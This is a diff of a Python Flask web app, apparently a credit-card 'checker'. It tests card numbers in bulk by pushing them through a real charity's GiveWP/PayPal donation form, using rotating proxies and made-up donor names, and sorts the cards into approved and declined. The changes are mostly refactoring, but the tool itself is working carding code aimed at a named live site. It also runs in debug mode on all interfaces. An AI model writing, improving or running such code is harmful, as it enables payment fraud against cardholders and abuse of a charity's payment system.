@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, jsonify, session
+from flask import Flask, render_template_string, request, jsonify
 import requests
 import re
 import time
@@ -6,17 +6,35 @@ import random
 import threading
 import queue
 from datetime import datetime
-import json
 
 app = Flask(__name__)
-app.secret_key = 'admin0000'
 
-# Listas de nomes
+# Função para ler o arquivo HTML
+def get_html():
+    try:
+        with open('index.html', 'r', encoding='utf-8') as f:
+            return f.read()
+    except FileNotFoundError:
+        return """
+        <!DOCTYPE html>
+        <html>
+        <head><title>Erro</title></head>
+        <body>
+            <h1>Arquivo index.html não encontrado</h1>
+            <p>Certifique-se que o arquivo index.html está na mesma pasta que o app.py</p>
+        </body>
+        </html>
+        """
+
+@app.route('/')
+def index():
+    return render_template_string(get_html())
+
+# ==================== LISTAS E CONFIGURAÇÕES ====================
+
 nomes = ["Liam", "Noah", "Oliver", "Elijah", "James", "William", "Benjamin", "Lucas", "Henry", 
          "Alexander", "Michael", "Daniel", "Matthew", "Joseph", "David", "Samuel", "John", "Ethan",
-         "Jacob", "Logan", "Jackson", "Sebastian", "Jack", "Aiden", "Owen", "Leo", "Wyatt", "Jayden",
-         "Gabriel", "Carter", "Luke", "Grayson", "Isaac", "Lincoln", "Mason", "Theodore", "Ryan",
-         "Nathan", "Andrew", "Joshua", "Thomas", "Charles", "Caleb", "Christian", "Hunter", "Jonathan"]
+         "Jacob", "Logan", "Jackson", "Sebastian", "Jack", "Aiden", "Owen", "Leo", "Wyatt", "Jayden"]
 
 apelidos = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez",
             "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Thompson",
@@ -29,6 +47,8 @@ current_proxy_index = 0
 proxy_lock = threading.Lock()
 request_counter = 0
 request_lock = threading.Lock()
+
+# ==================== FUNÇÕES DE PROXY ====================
 
 def parse_proxy(proxy_string):
     """Parse diferentes formatos de proxy HTTP"""
@@ -60,7 +80,7 @@ def test_proxy(proxy_url):
         return False
 
 def get_next_proxy():
-    """Retorna o próximo proxy da lista de forma round-robin a cada 5 requisições"""
+    """Retorna o próximo proxy da lista"""
     global current_proxy_index, request_counter
     
     with proxy_lock:
@@ -83,6 +103,8 @@ def get_session_with_proxy():
     if proxy:
         session.proxies.update(proxy)
     return session
+
+# ==================== FUNÇÕES DO CHECKER ====================
 
 def get_bin_info(bin_number):
     try:
@@ -110,7 +132,7 @@ def check_card(card_details):
             'status': 'DECLINED ❌',
             'response': 'Invalid format',
             'card': card_details,
-            'message': 'Invalid card format'
+            'message': 'Use formato: NUMERO|MM|AA|CVV'
         }
     
     cc = parts[0]
@@ -137,7 +159,7 @@ def check_card(card_details):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
         }
         
-        response = session.get('https://solefamily.org/donate/', cookies=session.cookies, headers=headers)
+        session.get('https://solefamily.org/donate/', cookies=session.cookies, headers=headers)
         
         params = {'giveDonationFormInIframe': '1'}
         res = session.get('https://solefamily.org/give/23178', params=params, cookies=session.cookies, headers=headers).text
@@ -179,7 +201,7 @@ def check_card(card_details):
             'give_ajax': (None, 'true'),
         }
         
-        response = session.post('https://solefamily.org/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers, files=files)
+        session.post('https://solefamily.org/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers, files=files)
         time.sleep(1)
         
         params = {'action': 'give_paypal_commerce_create_order'}
@@ -282,9 +304,7 @@ def check_card(card_details):
             'message': f'ERROR ❌|{str(e)}'
         }
 
-@app.route('/')
-def index():
-    return render_template('index.html')
+# ==================== ROTAS DA API ====================
 
 @app.route('/api/add_proxies', methods=['POST'])
 def api_add_proxies():
@@ -340,7 +360,7 @@ def api_test_proxies():
 def api_view_proxies():
     return jsonify({
         'total': len(proxies_list),
-        'proxies': proxies_list[:20]  # Mostrar apenas os primeiros 20
+        'proxies': proxies_list[:20]
     })
 
 @app.route('/api/delete_proxies', methods=['POST'])
@@ -361,7 +381,6 @@ def api_check_single():
     data = request.json
     card = data.get('card', '')
     
-    # Validar formato
     pattern = r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3}'
     if not re.match(pattern, card):
         return jsonify({
@@ -379,7 +398,6 @@ def api_check_single():
 def api_check_mass():
     data = request.json
     cards_text = data.get('cards', '')
-    threads_count = data.get('threads', max_threads)
     
     pattern = r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3}'
     cards = re.findall(pattern, cards_text)
@@ -394,7 +412,6 @@ def api_check_mass():
     approved = []
     declined = []
     
-    # Processar cards (simplificado para exemplo)
     for card in cards:
         result = check_card(card)
         results.append(result)
@@ -402,6 +419,7 @@ def api_check_mass():
             approved.append(result)
         else:
             declined.append(result)
+        time.sleep(0.5)  # Pequeno delay entre verificações
     
     return jsonify({
         'success': True,
@@ -421,9 +439,16 @@ def api_get_status():
         'status': 'Online'
     })
 
+# ==================== MAIN ====================
 if __name__ == '__main__':
-    print("🚀 Checker API Started Successfully!")
-    print(f"📍 Visit: http://localhost:5000")
-    print(f"⚙️ Threads configured: {max_threads}")
-    print(f"🌐 Proxy rotation: Every 5 requests")
+    print("=" * 50)
+    print("🚀 CHECKER WEB INICIADO COM SUCESSO!")
+    print("=" * 50)
+    print(f"📍 Acesse no navegador: http://localhost:5000")
+    print(f"⚙️ Threads configuradas: {max_threads}")
+    print(f"🌐 Rotação de proxy: A cada 5 requisições")
+    print(f"📁 HTML está na mesma pasta que o app.py")
+    print("=" * 50)
+    print("⚠️  Pressione CTRL+C para parar o servidor")
+    print("=" * 50)
     app.run(debug=True, host='0.0.0.0', port=5000)
